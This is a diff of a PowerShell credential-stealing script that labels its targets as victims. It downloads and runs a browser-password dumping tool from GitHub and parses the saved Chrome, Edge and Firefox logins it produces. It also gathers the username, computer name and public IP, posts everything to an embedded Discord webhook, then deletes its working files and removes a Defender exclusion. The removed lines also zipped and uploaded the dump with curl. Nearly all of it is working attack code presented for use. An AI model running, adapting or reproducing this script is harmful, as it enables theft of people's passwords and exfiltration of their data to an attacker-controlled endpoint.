@@ -1,45 +1,75 @@
-# Adding Windows Defender exclusion path
+# Add Windows Defender exclusion
+#Add-MpPreference -ExclusionPath "$env:appdata"
 Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
 
-
-# Creating the directory we will work on
+# Create working directory
 mkdir "$env:appdata\Microsoft\dump" -Force
 Set-Location "$env:appdata\Microsoft\dump"
 
-# Downloading and executing hackbrowser.exe
+# Download and run HackBrowser
 Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Remove-Item "hb.exe" -Force
 
-# Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
-
-# Get victim information
+# Get victim info
 $ip = (Invoke-RestMethod "http://ifconfig.me/ip").Trim()
 $username = $env:USERNAME
-$computerName = $env:COMPUTERNAME
-$manufacturer = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
-$model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
+$computer = $env:COMPUTERNAME
 
-# Discord Webhook URL (YOUR TEST WEBHOOK)
-$webhookUrl = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"
+# Discord webhook
+$webhook = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"
 
-# Create Discord embed message
+# Read stolen credentials from JSON files
+$allCreds = @()
+
+# Check for Chrome passwords
+if (Test-Path "chrome_passwords.json") {
+    $chromeCreds = Get-Content "chrome_passwords.json" | ConvertFrom-Json
+    foreach ($cred in $chromeCreds) {
+        $allCreds += "🔵 **Chrome** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
+    }
+}
+
+# Check for Edge passwords
+if (Test-Path "edge_passwords.json") {
+    $edgeCreds = Get-Content "edge_passwords.json" | ConvertFrom-Json
+    foreach ($cred in $edgeCreds) {
+        $allCreds += "🔷 **Edge** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
+    }
+}
+
+# Check for Firefox passwords
+if (Test-Path "firefox_passwords.json") {
+    $firefoxCreds = Get-Content "firefox_passwords.json" | ConvertFrom-Json
+    foreach ($cred in $firefoxCreds) {
+        $allCreds += "🦊 **Firefox** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
+    }
+}
+
+# If no credentials found
+if ($allCreds.Count -eq 0) {
+    $allCreds += "⚠️ No saved passwords found in browsers"
+}
+
+# Combine all credentials
+$credsText = $allCreds -join "`n"
+
+# Discord message with credentials as text
 $payload = @{
-    content = "🎯 **New Victim Compromised!**"
+    content = "🎯 **NEW VICTIM COMPROMISED**"
     embeds = @(
         @{
-            title = "✅ Successfully PWNED: $username"
+            title = "💻 System Information"
             color = 15158332  # Red
             fields = @(
                 @{
-                    name = "👤 Username"
+                    name = "👤 User"
                     value = $username
                     inline = $true
                 }
                 @{
-                    name = "💻 Computer"
-                    value = $computerName
+                    name = "🖥️ Computer"
+                    value = $computer
                     inline = $true
                 }
                 @{
@@ -47,28 +77,20 @@ $payload = @{
                     value = $ip
                     inline = $false
                 }
-                @{
-                    name = "🖥️ System Info"
-                    value = "$manufacturer $model"
-                    inline = $false
-                }
             )
-            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
-            footer = @{
-                text = "Credential Stealer v2.0"
-            }
+        },
+        @{
+            title = "🔑 Stolen Credentials"
+            description = $credsText
+            color = 16776960  # Yellow
         }
     )
-} | ConvertTo-Json -Depth 4
+} | ConvertTo-Json -Depth 10
 
-# Send notification to Discord
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-
-# Send the ZIP file with stolen credentials
-$filePath = "$env:appdata\Microsoft\dump\dump.zip"
-curl.exe -F "content=📦 Stolen credentials attached" -F "file=@$filePath" $webhookUrl
+# Send to Discord
+Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json; charset=utf-8'
 
 # Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
+Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
